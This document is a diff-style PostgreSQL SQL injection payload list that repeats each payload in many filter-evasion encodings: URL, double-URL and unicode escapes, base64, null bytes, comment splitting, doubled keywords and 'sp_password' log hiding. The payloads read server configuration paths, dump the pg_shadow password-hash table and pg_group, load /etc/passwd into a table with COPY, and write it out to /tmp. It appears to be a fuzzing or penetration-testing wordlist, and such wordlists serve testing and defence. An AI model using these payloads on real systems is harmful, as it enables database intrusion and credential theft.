+select%09current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting(%bf%27config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting('config_file');
+
+select current_setting(%EF%BC%87hba_file%EF%BC%87);
+
+select current_setting(%00%27hba_file%00%27);
+
+select current_setting('hba_file');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygnaGJhX2ZpbGUnKTsK
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2568%2562%2561%255F%2566%2569%256C%2565%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%68%62%61%5F%66%69%6C%65%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0068%u0062%u0061%u005F%u0066%u0069%u006C%u0065%u0027%u0029%u003B%u000A
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select /*!30793current_setting('hba_file');
+*/
+select /*!00000current_setting('hba_file');
+*/
+select current_setting('hba_file');
+
+SELSELECTECT current_setting('hba_file');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFhba%C0%DFfile%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%h%b%a%_%f%i%l%e%'%)%;%
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+ and '0having'='0having'
+select current_setting('hba_file');
+-- sp_password
+select/**/current_setting('hba_file');
+
+select--DaLvmsLs%0Acurrent_setting('hba_file');--OXyUqJ%0A
+select%23ujEGtcau%0Acurrent_setting('hba_file');%23FWcnrUJdfxg%0A
+select%23aitLdI%0Acurrent_setting('hba_file');%23eqNUeBBEb%0A
+select%05current_setting('hba_file');
+
+select%23%0Acurrent_setting('hba_file');%23%0A
+select%0Acurrent_setting('hba_file');
+
+select--%0Acurrent_setting('hba_file');--%0A
+select+current_setting('hba_file');
+
+select%0Ccurrent_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting(%bf%27hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting('hba_file');
+
+select current_setting(%EF%BC%87data_directory%EF%BC%87);
+
+select current_setting(%00%27data_directory%00%27);
+
+select current_setting('data_directory');
+%00
+c2VsZWN0IGN1cnJlbnRfc2V0dGluZygnZGF0YV9kaXJlY3RvcnknKTsK
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2564%2561%2574%2561%255F%2564%2569%2572%2565%2563%2574%256F%2572%2579%2527%2529%253B%250A
+%73%65%6C%65%63%74%20%63%75%72%72%65%6E%74%5F%73%65%74%74%69%6E%67%28%27%64%61%74%61%5F%64%69%72%65%63%74%6F%72%79%27%29%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u005F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0028%u0027%u0064%u0061%u0074%u0061%u005F%u0064%u0069%u0072%u0065%u0063%u0074%u006F%u0072%u0079%u0027%u0029%u003B%u000A
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select /*!30745current_setting('data_directory');
+*/
+select /*!00000current_setting('data_directory');
+*/
+select current_setting('data_directory');
+
+SELESELECTCT current_setting('data_directory');
+
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFdata%C0%DFdirectory%C0%AF%C0%AB%C0%BB%C0%8A
+%s%e%l%e%c%t %c%u%r%r%e%n%t%_%s%e%t%t%i%n%g%(%'%d%a%t%a%_%d%i%r%e%c%t%o%r%y%'%)%;%
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+ and '0having'='0having'
+select current_setting('data_directory');
+-- sp_password
+select/**/current_setting('data_directory');
+
+select--fAkoST%0Acurrent_setting('data_directory');--IeMmWtAZZu%0A
+select%23HefQXWmHpXB%0Acurrent_setting('data_directory');%23hWvKPw%0A
+select%23uJRWpi%0Acurrent_setting('data_directory');%23KfBoCPNRfRFl%0A
+select%01current_setting('data_directory');
+
+select%23%0Acurrent_setting('data_directory');%23%0A
+select%09current_setting('data_directory');
+
+select--%0Acurrent_setting('data_directory');--%0A
+select+current_setting('data_directory');
+
+select%0Acurrent_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting(%bf%27data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select current_setting('data_directory');
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+%00
+c2VsZWN0ICogZnJvbSBwZ19zaGFkb3c7Cg==
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2570%2567%255F%2573%2568%2561%2564%256F%2577%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%70%67%5F%73%68%61%64%6F%77%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0070%u0067%u005F%u0073%u0068%u0061%u0064%u006F%u0077%u003B%u000A
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select /*!30334* from pg_shadow;
+*/
+select /*!00000* from pg_shadow;
+*/
+select * from pg_shadow;
+
+SSELECTELECT * FRFROMOM pg_shadow;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AApg%C0%DFshadow%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %p%g%_%s%h%a%d%o%w%;%
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+ and '0having'='0having'
+select * from pg_shadow;
+-- sp_password
+select/**/*/**/from/**/pg_shadow;
+
+select--JiyulIYDEL%0A*--JxgoApL%0Afrom--BwldzChYDlj%0Apg_shadow;--kzFXZKcgLutG%0A
+select%23rMYhDDDZXyuN%0A*%23bFxcWEPgARh%0Afrom%23MRsYvGwWCMj%0Apg_shadow;%23vrxVydR%0A
+select%23NHzpPbJG%0A*%23QnQuSYgLWckT%0Afrom%23ZajBPY%0Apg_shadow;%23sRSlsse%0A
+select%02*%0Afrom%07pg_shadow;
+
+select%23%0A*%23%0Afrom%23%0Apg_shadow;%23%0A
+select%0A*%0Afrom%0Apg_shadow;
+
+select--%0A*--%0Afrom--%0Apg_shadow;--%0A
+select+*+from+pg_shadow;
+
+select%09*%0Afrom%0Apg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_shadow;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+%00
+c2VsZWN0ICogZnJvbSBwZ19ncm91cDsK
+select * from pg_group;
+
+select * from pg_group;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2570%2567%255F%2567%2572%256F%2575%2570%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%70%67%5F%67%72%6F%75%70%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0070%u0067%u005F%u0067%u0072%u006F%u0075%u0070%u003B%u000A
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select /*!30409* from pg_group;
+*/
+select /*!00000* from pg_group;
+*/
+select * from pg_group;
+
+SELSELECTECT * FRFROMOM pg_group;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AApg%C0%DFgroup%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %p%g%_%g%r%o%u%p%;%
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+ and '0having'='0having'
+select * from pg_group;
+-- sp_password
+select/**/*/**/from/**/pg_group;
+
+select--idHOtEJ%0A*--RrIwGZVSIq%0Afrom--pIrQuP%0Apg_group;--oISZueAQyJ%0A
+select%23YtiILks%0A*%23cNGWJsNig%0Afrom%23FdUxmuNhT%0Apg_group;%23uUgGbKaaMlFN%0A
+select%23KKXrrkqaBY%0A*%23ZlcsbWpz%0Afrom%23eNklXrI%0Apg_group;%23wnajvqjrQB%0A
+select%0A*%04from%0Cpg_group;
+
+select%23%0A*%23%0Afrom%23%0Apg_group;%23%0A
+select%0D*%0Afrom%0Cpg_group;
+
+select--%0A*--%0Afrom--%0Apg_group;--%0A
+select+*+from+pg_group;
+
+select%09*%09from%0Dpg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+select * from pg_group;
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+%00
+Y3JlYXRlIHRhYmxlIG15ZmlsZSAoaW5wdXQgVEVYVCk7Cg==
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+%2563%2572%2565%2561%2574%2565%2520%2574%2561%2562%256C%2565%2520%256D%2579%2566%2569%256C%2565%2520%2528%2569%256E%2570%2575%2574%2520%2554%2545%2558%2554%2529%253B%250A
+%63%72%65%61%74%65%20%74%61%62%6C%65%20%6D%79%66%69%6C%65%20%28%69%6E%70%75%74%20%54%45%58%54%29%3B%0A
+%u0063%u0072%u0065%u0061%u0074%u0065%u0020%u0074%u0061%u0062%u006C%u0065%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u0020%u0028%u0069%u006E%u0070%u0075%u0074%u0020%u0054%u0045%u0058%u0054%u0029%u003B%u000A
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create /*!30775table myfile (input TEXT);
+*/
+create /*!00000table myfile (input TEXT);
+*/
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create%C0%AAtable%C0%AAmyfile%C0%AA%C0%AAinput%C0%AATEXT%C0%AB%C0%BB%C0%8A
+%c%r%e%a%t%e %t%a%b%l%e %m%y%f%i%l%e %(%i%n%p%u%t %T%E%X%T%)%;%
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+ and '0having'='0having'
+create table myfile (input TEXT);
+-- sp_password
+create/**/table/**/myfile/**/(input/**/TEXT);
+
+create--xWDZpwxHqir%0Atable--MmvJFYwaW%0Amyfile--fQhBdFhzX%0A(input--zBJvRJ%0ATEXT);--vjHHjp%0A
+create%23wEyfqzuYhKzS%0Atable%23LouWbl%0Amyfile%23dFFcsZxDnC%0A(input%23lYEYwYTbo%0ATEXT);%23sMBmtM%0A
+create%23yvFPHpsJGpWw%0Atable%23FjbIYYh%0Amyfile%23bDDNxRBECGj%0A(input%23OiQNaYohJ%0ATEXT);%23hYKtrEBXOz%0A
+create%01table%08myfile%0F(input%08TEXT);
+
+create%23%0Atable%23%0Amyfile%23%0A(input%23%0ATEXT);%23%0A
+create%09table%09myfile%0D(input%0BTEXT);
+
+create--%0Atable--%0Amyfile--%0A(input--%0ATEXT);--%0A
+create+table+myfile+(input+TEXT);
+
+create%0Atable%09myfile%0A(input%0DTEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+create table myfile (input TEXT);
+
+copy myfile from %EF%BC%87/etc/passwd%EF%BC%87; 
+
+copy myfile from %00%27/etc/passwd%00%27; 
+
+copy myfile from '/etc/passwd'; 
+%00
+Y29weSBteWZpbGUgZnJvbSAnL2V0Yy9wYXNzd2QnOyAK
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+%2563%256F%2570%2579%2520%256D%2579%2566%2569%256C%2565%2520%2566%2572%256F%256D%2520%2527%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564%2527%253B%2520%250A
+%63%6F%70%79%20%6D%79%66%69%6C%65%20%66%72%6F%6D%20%27%2F%65%74%63%2F%70%61%73%73%77%64%27%3B%20%0A
+%u0063%u006F%u0070%u0079%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0027%u002F%u0065%u0074%u0063%u002F%u0070%u0061%u0073%u0073%u0077%u0064%u0027%u003B%u0020%u000A
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy /*!30401myfile from '/etc/passwd'; 
+*/
+copy /*!00000myfile from '/etc/passwd'; 
+*/
+copy myfile from '/etc/passwd'; 
+
+copy myfile FFROMROM '/etc/passwd'; 
+
+copy%C0%AAmyfile%C0%AAfrom%C0%AA%C0%AF%C0%AFetc%C0%AFpasswd%C0%AF%C0%BB%C0%AA%C0%8A
+%c%o%p%y %m%y%f%i%l%e %f%r%o%m %'%/%e%t%c%/%p%a%s%s%w%d%'%; %
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+ and '0having'='0having'
+copy myfile from '/etc/passwd'; 
+-- sp_password
+copy/**/myfile/**/from/**/'/etc/passwd';/**/
+
+copy--dwxwyuu%0Amyfile--SXxMbJUw%0Afrom--CzxKxHr%0A'/etc/passwd';--RsVeSqI%0A--lhfAjFWAbm%0A
+copy%23kUjnJQsqRJwT%0Amyfile%23XIknMynPQac%0Afrom%23SGASeBcFFeo%0A'/etc/passwd';%23SqnpLK%0A%23dCvhIkNmG%0A
+copy%23HyqvlsNqNS%0Amyfile%23RdLgAJKdt%0Afrom%23elRlTkzyY%0A'/etc/passwd';%23wmByNtWf%0A%23slJmvhhcasl%0A
+copy%0Emyfile%0Efrom%0E'/etc/passwd';%0A
+
+copy%23%0Amyfile%23%0Afrom%23%0A'/etc/passwd';%23%0A%23%0A
+copy%09myfile%0Afrom%0B'/etc/passwd';%09
+
+copy--%0Amyfile--%0Afrom--%0A'/etc/passwd';--%0A--%0A
+copy+myfile+from+'/etc/passwd';+
+
+copy%0Cmyfile%0Afrom%0C'/etc/passwd';%0D
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from %bf%27/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+copy myfile from '/etc/passwd'; 
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+%00
+c2VsZWN0ICogZnJvbSBteWZpbGU7Y29weSBteWZpbGUgdG8gL3RtcC90ZXN0Owo=
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%256D%2579%2566%2569%256C%2565%253B%2563%256F%2570%2579%2520%256D%2579%2566%2569%256C%2565%2520%2574%256F%2520%252F%2574%256D%2570%252F%2574%2565%2573%2574%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%6D%79%66%69%6C%65%3B%63%6F%70%79%20%6D%79%66%69%6C%65%20%74%6F%20%2F%74%6D%70%2F%74%65%73%74%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u003B%u0063%u006F%u0070%u0079%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u0020%u0074%u006F%u0020%u002F%u0074%u006D%u0070%u002F%u0074%u0065%u0073%u0074%u003B%u000A
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select /*!30775* from myfile;copy myfile to /tmp/test;
+*/
+select /*!00000* from myfile;copy myfile to /tmp/test;
+*/
+select * from myfile;copy myfile to /tmp/test;
+
+SELSELECTECT * FRFROMOM myfile;copy myfile to /tmp/test;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAmyfile%C0%BBcopy%C0%AAmyfile%C0%AAto%C0%AA%C0%AFtmp%C0%AFtest%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %m%y%f%i%l%e%;%c%o%p%y %m%y%f%i%l%e %t%o %/%t%m%p%/%t%e%s%t%;%
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+ and '0having'='0having'
+select * from myfile;copy myfile to /tmp/test;
+-- sp_password
+select/**/*/**/from/**/myfile;copy/**/myfile/**/to/**//tmp/test;
+
+select--blMffVTZ%0A*--jwRqFmw%0Afrom--gBgKFGm%0Amyfile;copy--jMqqmG%0Amyfile--jksPkE%0Ato--wBmLZkcKGSUc%0A/tmp/test;--adAhaeCE%0A
+select%23rGeYzem%0A*%23YxTbLdApVgz%0Afrom%23YZnpJYX%0Amyfile;copy%23avGyIYqfa%0Amyfile%23nLowznCDBGo%0Ato%23qrYtUmVUm%0A/tmp/test;%23xjYhwqrhk%0A
+select%23ZoPBDUOWQBiZ%0A*%23OikViz%0Afrom%23befIAd%0Amyfile;copy%23uQWcMfrcD%0Amyfile%23GiiHGrXFViUI%0Ato%23chDGttoiQgVv%0A/tmp/test;%23bFVryDVgmqd%0A
+select%0E*%02from%0Cmyfile;copy%08myfile%02to%0D/tmp/test;
+
+select%23%0A*%23%0Afrom%23%0Amyfile;copy%23%0Amyfile%23%0Ato%23%0A/tmp/test;%23%0A
+select%0A*%0Afrom%0Dmyfile;copy%0Cmyfile%0Dto%0B/tmp/test;
+
+select--%0A*--%0Afrom--%0Amyfile;copy--%0Amyfile--%0Ato--%0A/tmp/test;--%0A
+select+*+from+myfile;copy+myfile+to+/tmp/test;
+
+select%09*%09from%0Cmyfile;copy%09myfile%0Dto%0C/tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
+select * from myfile;copy myfile to /tmp/test;
+
